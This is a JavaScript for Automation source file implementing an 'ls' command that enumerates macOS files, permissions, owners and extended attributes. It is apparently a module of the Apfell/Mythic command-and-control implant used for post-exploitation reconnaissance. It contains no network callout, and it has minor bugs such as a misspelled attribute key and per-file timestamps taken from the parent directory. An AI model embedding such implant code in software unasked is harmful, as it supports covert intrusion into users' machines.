exports.ls = function(task, command, params){
    ObjC.import('Foundation');
    let output = {};
    try {
        let command_params = JSON.parse(params);
        let fileManager = $.NSFileManager.defaultManager;
        let error = Ref();
        let path = command_params['path'];
        if (path === "" || path === ".") {
            path = fileManager.currentDirectoryPath.js;
            if (path === undefined || path === "") {
                return {
                    "user_output": "Failed to get current working directory",
                    "completed": true,
                    "status": "error"
                };
            }
        }
        if (path[0] === '"') {
            path = path.substring(1, path.length - 1);
        }
        if(path[0] === '~'){
            path = $(path).stringByExpandingTildeInPath.js;
        }
        output['host'] = ObjC.unwrap(apfell.procInfo.hostName);
        let attributes = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path), error));
        if (attributes !== undefined) {
            output['is_file'] = true;
            output['files'] = [];
            if (attributes.hasOwnProperty('NSFileType') && attributes['NSFileType'] === "NSFileTypeDirectory") {
                let error = Ref();
                output['is_file'] = false;
                let files = ObjC.deepUnwrap(fileManager.contentsOfDirectoryAtPathError($(path), error));
                if (files !== undefined) {
                    let files_data = [];
                    output['success'] = true;
                    let sub_files = files;
                    if (path[path.length - 1] !== "/") {
                        path = path + "/";
                    }
                    for (let i = 0; i < sub_files.length; i++) {
                        let attr = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), error));
                        let file_add = {};
                        file_add['name'] = sub_files[i];
                        file_add['is_file'] = attr['NSFileType'] !== "NSFileTypeDirectory";
                        let plistPerms = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), $()));
                        if(plistPerms['NSFileExtendedAttributes'] !== undefined){
                            let extended = {};
                            let perms = plistPerms['NSFileExtendedAttributes'].js;
                            for(let j in perms){
                                extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                            }
                            file_add['permissions'] = extended;
                        }else{
                            file_add['permissions'] = {};
                        }
                        file_add['size'] = attr['NSFileSize'];
                        let nsposix = attr['NSFilePosixPermissions'];
                        // we need to fix this mess to actually be real permission bits that make sense
                        file_add['permissions']['posix'] = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                        file_add['permissions']['owner'] = attr['NSFileOwnerAccountName'] + "(" + attr['NSFileOwnerAccountID'] + ")";
                        file_add['permissions']['group'] = attr['NSFileGroupOwnerAccountName'] + "(" + attr['NSFileGroupOwnerAccountID'] + ")";
                        file_add['permissions']['hidden'] = attr['NSFileExtenionAttribute'] === true;
                        file_add['permissions']['create_time'] = attributes['NSFileCreationDate'];
                        file_add['modify_time'] = attributes['NSFileModificationDate'];
                        file_add['access_time'] = "";
                        files_data.push(file_add);
                    }
                    output['files'] = files_data;
                }
                else{
                    output['success'] = false;
                }
            }
            let nsposix = attributes['NSFilePosixPermissions'];
            let components =  ObjC.deepUnwrap( fileManager.componentsToDisplayForPath(path) ).slice(1, -1);
            if( components.length > 0 && components[0] === "Macintosh HD"){
                components.pop();
            }
            output['parent_path'] = "/" + components.join("/");
            output['name'] = fileManager.displayNameAtPath(path).js;
            if(output['name'] === "Macintosh HD"){output['name'] = "/";}
            if(output['name'] === output['parent_path']){output['parent_path'] = "";}
            output['size'] = attributes['NSFileSize'];
            output['access_time'] = "";
            output['modify_time'] = attributes['NSFileModificationDate'];
            if(attributes['NSFileExtendedAttributes'] !== undefined){
                let extended = {};
                let perms = attributes['NSFileExtendedAttributes'].js;
                for(let j in perms){
                    extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                }
                output['permissions'] = extended;
            }else{
                output['permissions'] = {};
            }
            output['permissions']['create_time'] = attributes['NSFileCreationDate'];
            output['permissions']['posix'] =((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
            output['permissions']['owner'] = attributes['NSFileOwnerAccountName'] + "(" + attributes['NSFileOwnerAccountID'] + ")";
            output['permissions']['group'] = attributes['NSFileGroupOwnerAccountName'] + "(" + attributes['NSFileGroupOwnerAccountID'] + ")";
            output['permissions']['hidden'] = attributes['NSFileExtensionHidden'] === true;
            if(command_params['file_browser'] === "true"){
                return {"file_browser": output, "completed": true, "user_output": "added data to file browser"};
            }else{
                return {"file_browser": output, "completed": true, "user_output": JSON.stringify(output, null, 6)};
            }
        }
        else{
            return {
                "user_output": "Failed to get attributes of file. File doesn't exist or you don't have permission to read it",
                "completed": true,
                "status": "error"
            };
        }

    }catch(error){
        return {
            "user_output": "Error: " + error.toString(),
            "completed": true,
            "status": "error"
        };
    }
};
